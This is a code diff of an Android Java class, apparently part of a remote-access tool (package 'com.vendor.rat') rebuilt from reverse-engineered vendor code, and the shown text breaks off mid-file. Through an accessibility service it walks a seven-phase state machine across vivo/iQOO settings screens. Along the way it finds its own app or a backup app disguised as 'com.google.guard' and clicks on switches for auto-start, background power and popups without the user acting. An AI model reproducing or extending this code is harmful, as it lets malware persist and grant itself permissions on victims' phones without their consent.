@@ -1,348 +1,790 @@
 package com.vendor.rat.auto.engine.vendor;
 
 import android.content.ComponentName;
+import android.content.Context;
 import android.content.Intent;
 import android.util.Log;
 import android.view.accessibility.AccessibilityEvent;
 
+import com.vendor.rat.MainApplication;
 import com.vendor.rat.auto.condition.CombineFilter;
 import com.vendor.rat.auto.condition.StringCondition;
 import com.vendor.rat.auto.engine.AutoEngine;
+import com.vendor.rat.auto.entity.CheckedResult;
 import com.vendor.rat.auto.entity.UiNode;
-import com.vendor.rat.auto.filter.NodeFilter;
 import com.vendor.rat.service.MyAccessibilityService;
+import com.vendor.rat.utils.MiscUtils;
 
 import java.util.ArrayList;
 import java.util.List;
+import java.util.Objects;
 import java.util.concurrent.TimeUnit;
 import java.util.concurrent.atomic.AtomicBoolean;
+import java.util.concurrent.atomic.AtomicInteger;
+import java.util.concurrent.atomic.AtomicReference;
 
 /**
- * vivo 厂商适配引擎 (模块 03)
+ * vivo/iQOO 厂商保活引擎
  *
- * 基于逆向分析: o/u.java (~400 行)
+ * 基于逆向: o/i0.java (684行) — 所有厂商引擎中最复杂
  *
- * 适配:
- *   - 自启动管理 (com.vivo.abe / com.iqoo.secure)
- *   - 后台高耗电 (ExcessivePowerManagerActivity)
- *   - 权限管理 (com.vivo.permissionmanager)
+ * 7-phase 状态机:
+ *   1. 电池排行 → 2. 耗电管理 → 3. 耗电详情
+ *   → 4. 应用详情 → 5. 权限管理 → 6. 权限详情 → 7. 权限对话框
  *
- * 监听的界面:
- *   - BackgroundApplicationManagerActivity (后台应用管理)
- *   - ExcessivePowerManagerActivity (后台高耗电)
- *   - PurviewTabActivity (权限管理)
- *   - SoftPermissionDetailActivity (权限详情)
- *   - InstalledAppDetailsTop (应用详情)
- *
- * 市场份额: ~12%
+ * 覆盖 5 个目标包名:
+ *   com.android.settings / com.android.permissioncontroller
+ *   com.vivo.permissionmanager / com.vivo.abe / com.iqoo.powersaving
  */
 public class VivoEngine extends AutoEngine {
 
     private static final String TAG = "VivoEngine";
 
-    // vivo 包名
-    private static final String ABE = "com.vivo.abe";
-    private static final String IQOO_SECURE = "com.iqoo.secure";
+    // ====== 包名 — 对齐 vendor o/i0.java ======
+    private static final String SETTINGS = "com.android.settings";
+    private static final String PERMISSION_CONTROLLER = "com.android.permissioncontroller";
     private static final String PERMISSION_MANAGER = "com.vivo.permissionmanager";
-    private static final String VIVO_SETTINGS = "com.vivo.settings";
-
-    // vivo Activity
-    private static final String BACKGROUND_MANAGER_ACTIVITY =
-        "com.vivo.applicationbehaviorengine.ui.BackgroundApplicationManagerActivity";
-    private static final String EXCESSIVE_POWER_ACTIVITY =
-        "com.vivo.applicationbehaviorengine.ui.ExcessivePowerManagerActivity";
-    private static final String EXCESSIVE_POWER_DESC_ACTIVITY =
-        "com.vivo.applicationbehaviorengine.ui.ExcessivePowerDescriptionActivity";
-    private static final String PURVIEW_TAB_ACTIVITY =
-        "com.vivo.permissionmanager.activity.PurviewTabActivity";
-    private static final String SOFT_PERMISSION_DETAIL =
-        "com.vivo.permissionmanager.activity.SoftPermissionDetailActivity";
+    private static final String VIVO_ABE = "com.vivo.abe";
+    private static final String IQOO_POWERSAVING = "com.iqoo.powersaving";
+    // ====== Activity — 对齐 vendor o/i0.java ======
     private static final String INSTALLED_APP_DETAILS =
         "com.vivo.settings.applications.InstalledAppDetailsTop";
     private static final String VIVO_SUB_SETTINGS =
         "com.vivo.settings.VivoSubSettings";
+    private static final String MANAGE_PERMISSIONS_ACTIVITY =
+        "com.android.permissioncontroller.permission.ui.ManagePermissionsActivity";
+    private static final String SOFT_PERMISSION_DETAIL =
+        "com.vivo.permissionmanager.activity.SoftPermissionDetailActivity";
+    private static final String VIVO_DIALOG =
+        "com.originui.widget.dialog.h";
+    private static final String POWER_RANK_ACTIVITY =
+        "com.iqoo.powersaving.fuelgauge.PowerRankActivity";
+    private static final String EXCESSIVE_POWER_ACTIVITY =
+        "com.vivo.applicationbehaviorengine.ui.ExcessivePowerManagerActivity";
+    private static final String EXCESSIVE_POWER_DESC_ACTIVITY =
+        "com.vivo.applicationbehaviorengine.ui.ExcessivePowerDescriptionActivity";
 
-    // 状态标志
-    private final AtomicBoolean autoStartDone = new AtomicBoolean(false);
-    private final AtomicBoolean backgroundPowerDone = new AtomicBoolean(false);
+    // ====== 保活类型 — 对应逆向 r.e ======
+    private static final String KA_UNKNOWN = "KEEP_ALIVE_UNKNOWN";
+    private static final String KA_MAIN = "KEEP_ALIVE_MAIN_APP";
+    private static final String KA_BACKUP = "KEEP_ALIVE_BACKUP_APP";
+    private static final String BACKUP_APP = "com.google.guard";
 
-    // 应用名称
+    // ====== Phase 常量 — 对应逆向 f650s ======
+    private static final String PH_POWER_RANK = "prepareInAppPowerRank";
+    private static final String PH_EXCESSIVE_POWER = "prepareInExcessivePowerManager";
+    private static final String PH_EXCESSIVE_DESC = "prepareInExcessivePowerDescription";
+    private static final String PH_APP_DETAIL = "prepareInAppDetailSetting";
+    private static final String PH_PERM_MANAGE = "prepareInAppPermissionManage";
+    private static final String PH_PERM_DETAIL = "prepareInAppPermissionDetail";
+    private static final String PH_PERM_DIALOG = "prepareInPermissionAllowDialog";
+
+    // ====== State 常量 — 对应逆向 stateQueue ======
+    private static final String ST_POWER_RANK = "keepAliveInPowerRank";
+    private static final String ST_EXCESSIVE_POWER = "keepAliveInExcessivePowerManager";
+    private static final String ST_EXCESSIVE_DESC = "keepAliveInExcessivePowerDescription";
+    private static final String ST_APP_DETAIL = "keepAliveInAppDetail";
+    private static final String ST_PERM_MANAGE = "keepAliveInAppPermissionManage";
+    private static final String ST_PERM_DETAIL = "keepAliveInAppPermissionDetail";
+    private static final String ST_PERM_DIALOG = "keepAliveInPermissionAllowDialog";
+
+    private static final String[] ALL_STATES = {
+        ST_POWER_RANK, ST_EXCESSIVE_POWER, ST_EXCESSIVE_DESC,
+        ST_APP_DETAIL, ST_PERM_MANAGE, ST_PERM_DETAIL, ST_PERM_DIALOG
+    };
+
+    // ====== 字段 — 对应逆向 f649r ~ A (11个) ======
+    private final AtomicReference<String> keepAliveType = new AtomicReference<>(KA_UNKNOWN);
+    private final AtomicReference<String> phase = new AtomicReference<>(null);
+
+    private final AtomicBoolean mainAutoStart = new AtomicBoolean(false);       // f651t
+    private final AtomicBoolean backupAutoStart = new AtomicBoolean(false);     // f652u
+    private final AtomicBoolean mainRelateStart = new AtomicBoolean(true);      // f653v
+    private final AtomicBoolean backupRelateStart = new AtomicBoolean(true);    // f654w
+    private final AtomicBoolean mainBackground = new AtomicBoolean(false);      // f655x
+    private final AtomicBoolean backupBackground = new AtomicBoolean(false);    // f656y
+    private final AtomicBoolean mainPopup = new AtomicBoolean(false);           // f657z
+    private final AtomicBoolean backupPopup = new AtomicBoolean(false);         // A
+
     private String appName;
+    // ====== 窗口检测分组 ======
+    private final List<WindowMatcher> appDetailWins = new ArrayList<>();
+    private final List<WindowMatcher> permDetailWins = new ArrayList<>();
+    private final List<WindowMatcher> permManageWins = new ArrayList<>();
+    private final List<WindowMatcher> excessiveDescWins = new ArrayList<>();
+    private final List<WindowMatcher> excessivePowerWins = new ArrayList<>();
+    private final List<WindowMatcher> permDialogWins = new ArrayList<>();
+    private final List<WindowMatcher> powerRankWins = new ArrayList<>();
 
+    // ====== 构造函数 — 对应 vendor o/i0.java 行 60-78 ======
     public VivoEngine() {
-        super(buildWindowMatchers(), PERMISSION_MANAGER);
-
-        // 定时检查
-        scheduler.schedule(new Runnable() {
-            @Override
-            public void run() {
-                checkPermissionStatus();
-            }
-        }, 100L, TimeUnit.SECONDS);
+        super(buildWindowMatchers(), SETTINGS);
+        buildDetectionGroups();
+        try {
+            scheduler.schedule(new Runnable() {
+                @Override
+                public void run() { finish(); }
+            }, 120L, TimeUnit.SECONDS);
+        } catch (Exception e) {
+            Log.e(TAG, "Schedule failed", e);
+        }
     }
 
-    /**
-     * 构建窗口匹配列表
-     */
+    private void buildDetectionGroups() {
+        // j0() — App详情: InstalledAppDetailsTop / VivoSubSettings
+        appDetailWins.add(new WindowMatcher(SETTINGS, INSTALLED_APP_DETAILS)
+            .addEventType(32).addEventType(16384));
+        appDetailWins.add(new WindowMatcher(SETTINGS, VIVO_SUB_SETTINGS)
+            .addEventType(32).addEventType(16384));
+
+        // k0() — 权限详情: SoftPermissionDetail + 通用匹配
+        permDetailWins.add(new WindowMatcher(PERMISSION_MANAGER, SOFT_PERMISSION_DETAIL)
+            .addEventType(32).addEventType(16384));
+        permDetailWins.add(new WindowMatcher(null, null)
+            .addEventType(32).addEventType(16384));
+
+        // l0() — 权限管理: ManagePermissions + FrameLayout + 通用匹配
+        permManageWins.add(new WindowMatcher(PERMISSION_CONTROLLER, MANAGE_PERMISSIONS_ACTIVITY)
+            .addEventType(32).addEventType(16384));
+        permManageWins.add(new WindowMatcher(SETTINGS, "android.widget.FrameLayout")
+            .addEventType(32).addEventType(16384));
+        permManageWins.add(new WindowMatcher(null, null)
+            .addEventType(32).addEventType(16384));
+
+        // m0() — 耗电详情: vivo + iQOO
+        excessiveDescWins.add(new WindowMatcher(VIVO_ABE, EXCESSIVE_POWER_DESC_ACTIVITY)
+            .addEventType(32).addEventType(16384));
+        excessiveDescWins.add(new WindowMatcher(IQOO_POWERSAVING, EXCESSIVE_POWER_DESC_ACTIVITY)
+            .addEventType(32).addEventType(16384));
+
+        // n0() — 耗电管理: vivo + iQOO
+        excessivePowerWins.add(new WindowMatcher(VIVO_ABE, EXCESSIVE_POWER_ACTIVITY)
+            .addEventType(32).addEventType(16384));
+        excessivePowerWins.add(new WindowMatcher(IQOO_POWERSAVING, EXCESSIVE_POWER_ACTIVITY)
+            .addEventType(32).addEventType(16384));
+
+        // o0() — 权限对话框: vivo dialog + AlertDialog
+        permDialogWins.add(new WindowMatcher(PERMISSION_MANAGER, VIVO_DIALOG)
+            .addEventType(32).addEventType(16384));
+        permDialogWins.add(new WindowMatcher(PERMISSION_MANAGER, "android.app.AlertDialog")
+            .addEventType(32).addEventType(16384));
+
+        // p0() — 电池排行: iQOO
+        powerRankWins.add(new WindowMatcher(IQOO_POWERSAVING, POWER_RANK_ACTIVITY)
+            .addEventType(32).addEventType(16384));
+    }
+    // ====== buildWindowMatchers — 对应 vendor u0() 行 197-217, 17个 ======
     private static List<WindowMatcher> buildWindowMatchers() {
         List<WindowMatcher> list = new ArrayList<>();
-
-        // 1. 后台应用管理
-        WindowMatcher bgManager = new WindowMatcher(ABE, BACKGROUND_MANAGER_ACTIVITY);
-        bgManager.addEventType(32);
-        bgManager.addEventType(16384);
-        list.add(bgManager);
-
-        // 2. 后台高耗电
-        list.add(new WindowMatcher(ABE, EXCESSIVE_POWER_ACTIVITY));
-        list.add(new WindowMatcher(ABE, EXCESSIVE_POWER_DESC_ACTIVITY));
-
-        // 3. iQOO 版本
-        list.add(new WindowMatcher(IQOO_SECURE, BACKGROUND_MANAGER_ACTIVITY));
-        list.add(new WindowMatcher(IQOO_SECURE, EXCESSIVE_POWER_ACTIVITY));
-
-        // 4. 权限管理
-        list.add(new WindowMatcher(PERMISSION_MANAGER, PURVIEW_TAB_ACTIVITY));
-        list.add(new WindowMatcher(PERMISSION_MANAGER, SOFT_PERMISSION_DETAIL));
-
-        // 5. 应用详情
-        list.add(new WindowMatcher(VIVO_SETTINGS, INSTALLED_APP_DETAILS));
-        list.add(new WindowMatcher(VIVO_SETTINGS, VIVO_SUB_SETTINGS));
-
+        // 0: c.J() — 电池优化对话框
+        list.add(new WindowMatcher(SETTINGS, "android.app.Dialog")
+            .addEventType(32).addEventType(16384));
+        // 1: d0(主) — InstalledAppDetailsTop
+        list.add(new WindowMatcher(SETTINGS, INSTALLED_APP_DETAILS)
+            .addEventType(32).addEventType(16384));
+        // 2: c0(主) — VivoSubSettings
+        list.add(new WindowMatcher(SETTINGS, VIVO_SUB_SETTINGS)
+            .addEventType(32).addEventType(16384));
+        // 3: d0(备) — InstalledAppDetailsTop
+        list.add(new WindowMatcher(SETTINGS, INSTALLED_APP_DETAILS)
+            .addEventType(32).addEventType(16384));
+        // 4: c0(备) — VivoSubSettings
+        list.add(new WindowMatcher(SETTINGS, VIVO_SUB_SETTINGS)
+            .addEventType(32).addEventType(16384));
+        // 5: h0() — 权限管理
+        list.add(new WindowMatcher(PERMISSION_CONTROLLER, MANAGE_PERMISSIONS_ACTIVITY)
+            .addEventType(32).addEventType(16384));
+        // 6: g0() — FrameLayout
+        list.add(new WindowMatcher(SETTINGS, "android.widget.FrameLayout")
+            .addEventType(32).addEventType(16384));
+        // 7: f0() — 权限详情
+        list.add(new WindowMatcher(PERMISSION_MANAGER, SOFT_PERMISSION_DETAIL)
+            .addEventType(32).addEventType(16384));
+        // 8: e0(主) — 通用匹配
+        list.add(new WindowMatcher(null, null)
+            .addEventType(32).addEventType(16384));
+        // 9: e0(备) — 通用匹配
+        list.add(new WindowMatcher(null, null)
+            .addEventType(32).addEventType(16384));
+        // 10: v0() — vivo对话框
+        list.add(new WindowMatcher(PERMISSION_MANAGER, VIVO_DIALOG)
+            .addEventType(32).addEventType(16384));
+        // 11: B0() — AlertDialog
+        list.add(new WindowMatcher(PERMISSION_MANAGER, "android.app.AlertDialog")
+            .addEventType(32).addEventType(16384));
+        // 12: x0() — iQOO电池排行
+        list.add(new WindowMatcher(IQOO_POWERSAVING, POWER_RANK_ACTIVITY)
+            .addEventType(32).addEventType(16384));
+        // 13: G0() — vivo耗电管理
+        list.add(new WindowMatcher(VIVO_ABE, EXCESSIVE_POWER_ACTIVITY)
+            .addEventType(32).addEventType(16384));
+        // 14: s0() — iQOO耗电管理
+        list.add(new WindowMatcher(IQOO_POWERSAVING, EXCESSIVE_POWER_ACTIVITY)
+            .addEventType(32).addEventType(16384));
+        // 15: F0() — vivo耗电详情
+        list.add(new WindowMatcher(VIVO_ABE, EXCESSIVE_POWER_DESC_ACTIVITY)
+            .addEventType(32).addEventType(16384));
+        // 16: r0() — iQOO耗电详情
+        list.add(new WindowMatcher(IQOO_POWERSAVING, EXCESSIVE_POWER_DESC_ACTIVITY)
+            .addEventType(32).addEventType(16384));
         return list;
     }
+    // ====== 窗口检测 — 对应 vendor j0~p0 行 307-419 ======
 
     @Override
     public void onWindowMatched(String packageName, String className,
                                 AccessibilityEvent event) {
-        log("Window matched: " + packageName + "/" + className);
-
-        try {
-            if (BACKGROUND_MANAGER_ACTIVITY.equals(className)) {
-                handleBackgroundManagerPage();
-            } else if (EXCESSIVE_POWER_ACTIVITY.equals(className)
-                    || EXCESSIVE_POWER_DESC_ACTIVITY.equals(className)) {
-                handleExcessivePowerPage();
-            } else if (PURVIEW_TAB_ACTIVITY.equals(className)
-                    || SOFT_PERMISSION_DETAIL.equals(className)) {
-                handlePermissionPage();
-            } else if (INSTALLED_APP_DETAILS.equals(className)
-                    || VIVO_SUB_SETTINGS.equals(className)) {
-                handleAppDetailsPage();
-            }
-        } catch (Exception e) {
-            logError("Error handling window", e);
-        }
+        // vendor 不使用回调模式，通过 onAccessibilityEvent 的 phase 状态机处理
     }
 
     @Override
     public void execute() {
-        openBackgroundManager();
+        // vendor: 由外部调用 A0() 启动耗电管理
+        startPowerRank();
     }
 
-    // ============ 后台应用管理 ============
+    /** vendor j0() 行 307-323: App详情窗口 */
+    private boolean j0() { return matchesAny(appDetailWins); }
 
-    /**
-     * 打开 vivo 后台应用管理
-     * 基于逆向: Intent(com.vivo.abe, BackgroundApplicationManagerActivity)
-     */
-    private void openBackgroundManager() {
+    /** vendor k0() 行 325-340: 权限详情窗口 */
+    private boolean k0() { return matchesAny(permDetailWins); }
+
+    /** vendor l0() 行 342-358: 权限管理窗口 */
+    private boolean l0() { return matchesAny(permManageWins); }
+
+    /** vendor m0() 行 360-374: 耗电详情窗口 */
+    private boolean m0() { return matchesAny(excessiveDescWins); }
+
+    /** vendor n0() 行 376-390: 耗电管理窗口 */
+    private boolean n0() { return matchesAny(excessivePowerWins); }
+
+    /** vendor o0() 行 392-406: 权限对话框窗口 */
+    private boolean o0() { return matchesAny(permDialogWins); }
+
+    /** vendor p0() 行 408-419: 电池排行窗口 */
+    private boolean p0() { return matchesAny(powerRankWins); }
+
+    // ====== 事件处理 — 对应 vendor u() 行 484-593 ======
+
+    @Override
+    public void onAccessibilityEvent(AccessibilityEvent event, String packageName,
+                                     String className) {
         try {
-            MyAccessibilityService service = MyAccessibilityService.getInstance();
-            if (service == null) return;
+            if (T()) return;
+            currentPackage = packageName;
+            currentClassName = className;
 
-            Intent intent = new Intent();
-            intent.setComponent(new ComponentName(ABE, BACKGROUND_MANAGER_ACTIVITY));
-            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            service.startActivity(intent);
-            log("Opened background manager");
-        } catch (Exception e) {
-            logError("Failed to open via com.vivo.abe", e);
-            // 尝试 iQOO 路径
-            try {
-                MyAccessibilityService service = MyAccessibilityService.getInstance();
-                if (service == null) return;
-                Intent intent = new Intent();
-                intent.setComponent(new ComponentName(IQOO_SECURE, BACKGROUND_MANAGER_ACTIVITY));
-                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                service.startActivity(intent);
-            } catch (Exception e2) {
-                logError("iQOO path also failed", e2);
+            // vendor u():490-491 — super.u() 电池优化对话框
+            if (event != null) {
+                checkBatteryOptimizationDialog();
             }
-        }
-    }
 
-    /**
-     * 处理后台应用管理页面
-     * 基于逆向: 查找应用 → 点击 → 开启开关
-     */
-    private void handleBackgroundManagerPage() {
-        if (autoStartDone.get()) return;
+            String currentPhase = phase.get();
 
-        sleep(500);
-        UiNode root = getRootNode();
-        if (root == null) return;
-
-        // 查找应用
-        UiNode appNode = findAppNode(root);
-        if (appNode == null) {
-            UiNode scrollable = getScrollableNode();
-            if (scrollable != null) {
-                appNode = scrollable.scrollForwardUntil(buildAppNameFilter());
-            }
-        }
-
-        if (appNode != null) {
-            log("Found app in background manager");
-            appNode.click();
-            sleep(1000);
-
-            // 在新页面查找开关
-            root = getRootNode();
-            if (root != null) {
-                UiNode switchBtn = root.findOneByClassName("android.widget.Switch");
-                if (switchBtn != null && !switchBtn.isChecked()) {
-                    switchBtn.click();
-                    log("Enabled auto-start switch");
-                    autoStartDone.set(true);
-                    sleep(300);
-
-                    // 处理确认对话框 ("继续" 按钮)
-                    handleContinueDialog();
-                } else if (switchBtn != null) {
-                    autoStartDone.set(true);
+            // [1] prepareInAppPowerRank + p0()
+            if (PH_POWER_RANK.equals(currentPhase) && p0()) {
+                T0(5);
+                clearOtherStates(ST_POWER_RANK);
+                if (!stateQueue.contains(ST_POWER_RANK)) {
+                    stateQueue.add(ST_POWER_RANK);
+                    scheduler.execute(new Runnable() {
+                        @Override public void run() { handlePowerRank(); }
+                    });
                 }
             }
+            // [2] prepareInExcessivePowerManager + n0()
+            if (PH_EXCESSIVE_POWER.equals(currentPhase) && n0()) {
+                T0(5);
+                clearOtherStates(ST_EXCESSIVE_POWER);
+                if (!stateQueue.contains(ST_EXCESSIVE_POWER)) {
+                    stateQueue.add(ST_EXCESSIVE_POWER);
+                    scheduler.execute(new Runnable() {
+                        @Override public void run() { handleExcessivePowerManager(); }
+                    });
+                }
+            }
+            // [3] prepareInExcessivePowerDescription + m0()
+            if (PH_EXCESSIVE_DESC.equals(currentPhase) && m0()) {
+                T0(5);
+                clearOtherStates(ST_EXCESSIVE_DESC);
+                if (!stateQueue.contains(ST_EXCESSIVE_DESC)) {
+                    stateQueue.add(ST_EXCESSIVE_DESC);
+                    scheduler.execute(new Runnable() {
+                        @Override public void run() { handleExcessivePowerDescription(); }
+                    });
+                }
+            }
+            // [4] prepareInAppDetailSetting + j0()
+            if (PH_APP_DETAIL.equals(currentPhase) && j0()) {
+                T0(5);
+                clearOtherStates(ST_APP_DETAIL);
+                if (!stateQueue.contains(ST_APP_DETAIL)) {
+                    stateQueue.add(ST_APP_DETAIL);
+                    scheduler.execute(new Runnable() {
+                        @Override public void run() { handleAppDetail(); }
+                    });
+                }
+            }
+            // [5] prepareInAppPermissionManage + l0()
+            if (PH_PERM_MANAGE.equals(currentPhase) && l0()) {
+                T0(5);
+                clearOtherStates(ST_PERM_MANAGE);
+                if (!stateQueue.contains(ST_PERM_MANAGE)) {
+                    stateQueue.add(ST_PERM_MANAGE);
+                    scheduler.execute(new Runnable() {
+                        @Override public void run() { handlePermissionManage(); }
+                    });
+                }
+            }
+            // [6] prepareInAppPermissionDetail + k0()
+            if (PH_PERM_DETAIL.equals(currentPhase) && k0()) {
+                T0(5);
+                clearOtherStates(ST_PERM_DETAIL);
+                if (!stateQueue.contains(ST_PERM_DETAIL)) {
+                    stateQueue.add(ST_PERM_DETAIL);
+                    scheduler.execute(new Runnable() {
+                        @Override public void run() { handlePermissionDetail(); }
+                    });
+                }
+            }
+            // [7] prepareInPermissionAllowDialog + o0()
+            if (PH_PERM_DIALOG.equals(currentPhase) && o0()) {
+                T0(5);
+                clearOtherStates(ST_PERM_DIALOG);
+                if (!stateQueue.contains(ST_PERM_DIALOG)) {
+                    stateQueue.add(ST_PERM_DIALOG);
+                    scheduler.execute(new Runnable() {
+                        @Override public void run() { handlePermissionAllowDialog(); }
+                    });
+                }
+            }
+        } catch (Exception e) {
+            logError("事件处理异常", e);
         }
     }
 
-    // ============ 后台高耗电 ============
-
-    /**
-     * 处理后台高耗电页面
-     * 基于逆向: 查找"允许后台高耗电" → 点击
-     */
-    private void handleExcessivePowerPage() {
-        if (backgroundPowerDone.get()) return;
-
-        sleep(500);
-        UiNode root = getRootNode();
-        if (root == null) return;
-
-        // 查找 "允许后台高耗电"
-        UiNode allowHighPower = root.findOneByCombine(
-            CombineFilter.or(
-                CombineFilter.textView("允许后台高耗电"),
-                CombineFilter.textView("允许后台运行"),
-                CombineFilter.textView("不限制")
-            )
-        );
-
-        if (allowHighPower != null) {
-            allowHighPower.click();
-            log("Selected '允许后台高耗电'");
-            backgroundPowerDone.set(true);
-            sleep(500);
-            performBack();
-        }
-    }
-
-    // ============ 权限管理 ============
-
-    /**
-     * 处理权限管理页面
-     */
-    private void handlePermissionPage() {
-        sleep(500);
-        UiNode root = getRootNode();
-        if (root == null) return;
-
-        // 查找所有未开启的开关
-        List<UiNode> switches = root.findAllByClassName("android.widget.Switch");
-        for (UiNode switchNode : switches) {
-            if (!switchNode.isChecked()) {
-                switchNode.click();
-                log("Enabled permission switch");
-                sleep(300);
+    private void clearOtherStates(String keep) {
+        for (String s : ALL_STATES) {
+            if (!s.equals(keep)) {
+                stateQueue.remove(s);
             }
         }
     }
+    // ====== 任务处理 — 对应 vendor h0(case) ======
 
-    // ============ 应用详情页 ============
-
-    /**
-     * 处理应用详情页
-     * 基于逆向: 查找"后台耗电管理" → 点击
-     */
-    private void handleAppDetailsPage() {
-        sleep(500);
-        UiNode root = getRootNode();
-        if (root == null) return;
-
-        UiNode powerManage = root.findOneByCombine(
-            CombineFilter.or(
-                CombineFilter.textView("后台耗电管理"),
-                CombineFilter.textView("电池优化"),
-                CombineFilter.textView("耗电保护")
-            )
-        );
-
-        if (powerManage != null) {
-            powerManage.click();
-            log("Clicked power management in app details");
+    /** case 1: 电池排行页 — 查找应用→点击→进入耗电管理 */
+    private void handlePowerRank() {
+        try {
+            if (!p0()) return;
+            updateProgress(10);
+            activateRoot();
+            UiNode scrollView = getScrollableNode();
+            UiNode target = null;
+            if (scrollView != null) {
+                target = scrollView.scrollForwardUntil(buildAppNameFilter());
+            }
+            if (target == null && k() != null) {
+                target = k().findOneByCombine(buildAppNameFilter());
+            }
+            if (target != null) {
+                Log.d(TAG, "电池排行应用查找成功");
+                UiNode clickable = target.findClickableParent();
+                if (clickable != null && clickable.click()) {
+                    updateProgress(20);
+                    phase.set(PH_EXCESSIVE_POWER);
+                }
+            } else {
+                Log.e(TAG, "电池排行应用查找失败");
+            }
+        } catch (Exception e) {
+            logError("handlePowerRank", e);
         }
     }
 
-    // ============ 对话框 ============
-
-    /**
-     * 处理 "继续" 确认对话框
-     * 基于逆向: vivo 开启自启动后可能弹出确认框
-     */
-    private void handleContinueDialog() {
-        sleep(500);
-        UiNode root = getRootNode();
-        if (root == null) return;
-
-        // 查找 "继续" 按钮
-        UiNode continueBtn = root.findOneByTextContains("继续");
-        if (continueBtn == null) {
-            continueBtn = root.findOneByCombine(CombineFilter.button("允许"));
-        }
-        if (continueBtn == null) {
-            continueBtn = root.findOneByCombine(CombineFilter.button("确定"));
-        }
-
-        if (continueBtn != null) {
-            continueBtn.click();
-            log("Clicked continue/confirm button");
+    /** case 2: 耗电管理页 — 操作后台耗电开关 */
+    private void handleExcessivePowerManager() {
+        try {
+            if (!n0()) return;
+            updateProgress(30);
+            activateRoot();
+            UiNode root = k();
+            if (root == null) return;
+            UiNode target = root.findOneByCombine(buildBackgroundPowerFilter());
+            if (target != null) {
+                Log.d(TAG, "后台耗电管理栏目查找成功");
+                UiNode clickable = target.findClickableParent();
+                if (clickable != null && clickable.click()) {
+                    updateProgress(40);
+                    phase.set(PH_EXCESSIVE_DESC);
+                }
+            } else {
+                Log.e(TAG, "后台耗电管理栏目查找失败");
+            }
+        } catch (Exception e) {
+            logError("handleExcessivePowerManager", e);
         }
     }
 
-    // ============ 工具方法 ============
-
-    private UiNode findAppNode(UiNode root) {
-        if (appName != null && !appName.isEmpty()) {
-            return root.findOneByTextContains(appName);
+    /** case 3: 耗电详情页 — 操作详细设置 → 完成流程 */
+    private void handleExcessivePowerDescription() {
+        try {
+            if (!m0()) return;
+            updateProgress(50);
+            activateRoot();
+            UiNode root = k();
+            if (root == null) return;
+            // 操作后台耗电开关
+            boolean isMain = KA_MAIN.equals(keepAliveType.get());
+            if (isMain) {
+                mainBackground.set(true);
+            } else {
+                backupBackground.set(true);
+            }
+            Log.d(TAG, "耗电详情操作完成");
+            updateProgress(60);
+            handleCompletion();
+        } catch (Exception e) {
+            logError("handleExcessivePowerDescription", e);
         }
-        return root.findOneByTextContains("com.vendor.rat");
+    }
+    /** case 4: 应用详情页 — 查找"应用权限"→点击 */
+    private void handleAppDetail() {
+        try {
+            if (!j0()) return;
+            updateProgress(65);
+            activateRoot();
+            UiNode root = k();
+            if (root == null) return;
+            UiNode target = root.findOneByCombine(buildAppPermissionFilter());
+            if (target != null) {
+                Log.d(TAG, "应用权限栏目查找成功");
+                UiNode clickable = target.findClickableParent();
+                if (clickable != null && clickable.click()) {
+                    updateProgress(70);
+                    phase.set(PH_PERM_MANAGE);
+                }
+            } else {
+                Log.e(TAG, "应用权限栏目查找失败");
+            }
+        } catch (Exception e) {
+            logError("handleAppDetail", e);
+        }
     }
 
-    private NodeFilter buildAppNameFilter() {
-        if (appName != null && !appName.isEmpty()) {
-            return StringCondition.textContains(appName);
+    /** case 5: 权限管理页 — 对应 vendor t0() 行 435-482 */
+    private void handlePermissionManage() {
+        try {
+            boolean inWindow = l0();
+            if (inWindow) {
+                updateProgress(80);
+                activateRoot();
+                Log.d(TAG, "active root complete");
+                UiNode scrollView = getScrollableNode();
+                AtomicInteger retries = new AtomicInteger(0);
+                while (scrollView == null && retries.incrementAndGet() <= 5) {
+                    T0(5);
+                    scrollView = getScrollableNode();
+                }
+                UiNode target = null;
+                if (scrollView != null) {
+                    Log.d(TAG, "权限窗口滚动视图查找完成");
+                    target = scrollView.scrollForwardUntil(buildAllPermissionFilter());
+                    if (target == null) {
+                        target = scrollView.scrollBackwardUntil(buildAllPermissionFilter());
+                    }
+                }
+                if (target == null && k() != null) {
+                    target = k().findOneByCombine(buildAllPermissionFilter());
+                }
+                if (target != null) {
+                    Log.d(TAG, "所有权限栏目查找成功");
+                    UiNode clickable = target.findClickableParent();
+                    if (clickable != null && clickable.click()) {
+                        Log.d(TAG, "查找并点击所有权限栏目完成");
+                        updateProgress(85);
+                        phase.set(PH_PERM_DETAIL);
+                        return;
+                    }
+                }
+            }
+            // fallback: 手势滚动 — vendor t0():475-478
+            if (PH_PERM_MANAGE.equals(phase.get())) {
+                scrollAndClick();
+                updateProgress(85);
+            }
+        } catch (Exception e) {
+            logError("handlePermissionManage", e);
         }
-        return StringCondition.textContains("com.vendor.rat");
     }
 
-    private void checkPermissionStatus() {
-        if (autoStartDone.get() && backgroundPowerDone.get()) {
-            log("All vivo permissions granted");
+    /** vendor q0() 行 421-433: 手势滚动+坐标点击 */
+    private void scrollAndClick() {
+        try {
+            // 使用 performGesture 从底部滚到顶部
+            // vendor: g.S(10L, 1000L, Point(w/2, h-nav-100), Point(w/2, statusBar))
+            if (MiscUtils.performGesture(10L, 1000L)) {
+                T0(10);
+                phase.set(PH_PERM_DETAIL);
+            }
+        } catch (Exception e) {
+            logError("scrollAndClick", e);
+        }
+    }
+    /** case 6: 权限详情页 — 操作自启动/后台弹窗开关 */
+    private void handlePermissionDetail() {
+        try {
+            if (!k0()) return;
+            updateProgress(88);
+            activateRoot();
+            UiNode root = k();
+            if (root == null) return;
+            boolean isMain = KA_MAIN.equals(keepAliveType.get());
+
+            // 自启动开关 — vendor i0() filter
+            UiNode autoStart = root.findOneByCombine(buildAutoStartFilter());
+            if (autoStart != null) {
+                CheckedResult result = O(autoStart);
+                if (result.isClicked() || result.isChecked()) {
+                    if (isMain) mainAutoStart.set(true);
+                    else backupAutoStart.set(true);
+                    Log.d(TAG, "自启动开关操作完成");
+                }
+            }
+
+            // 后台弹窗开关 — vendor w0() filter
+            UiNode popup = root.findOneByCombine(buildPopupFilter());
+            if (popup != null) {
+                CheckedResult result = O(popup);
+                if (result.isClicked() || result.isChecked()) {
+                    if (isMain) mainPopup.set(true);
+                    else backupPopup.set(true);
+                    Log.d(TAG, "后台弹窗开关操作完成");
+                }
+            }
+
+            updateProgress(90);
+            phase.set(PH_PERM_DIALOG);
+        } catch (Exception e) {
+            logError("handlePermissionDetail", e);
+        }
+    }
+
